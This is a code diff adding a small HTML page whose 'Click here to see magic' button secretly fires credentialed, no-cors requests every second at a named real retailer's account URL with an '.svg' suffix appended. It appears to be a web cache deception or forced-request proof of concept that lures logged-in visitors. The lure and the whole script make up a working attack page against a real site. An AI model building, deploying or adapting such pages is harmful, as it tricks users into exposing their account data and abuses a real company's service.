@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Magic Button</title>
+</head>
+<body>
+  <button id="magicBtn">Click here to see magic</button>
+
+  <script>
+    document.getElementById("magicBtn").addEventListener("click", function () {
+      setInterval(() => {
+        fetch("https://www.acquadiparma.com/en/gb/show-account/.svg", {
+          method: "GET",
+credentials: "include",
+          mode: "no-cors"
+        })
+        .then(() => {
+          console.log("Request sent (no-cors)");
+        })
+        .catch(error => {
+          console.error("Error sending request:", error);
+        });
+      }, 1000); // every 1 second
+    });
+  </script>
+</body>
+</html>
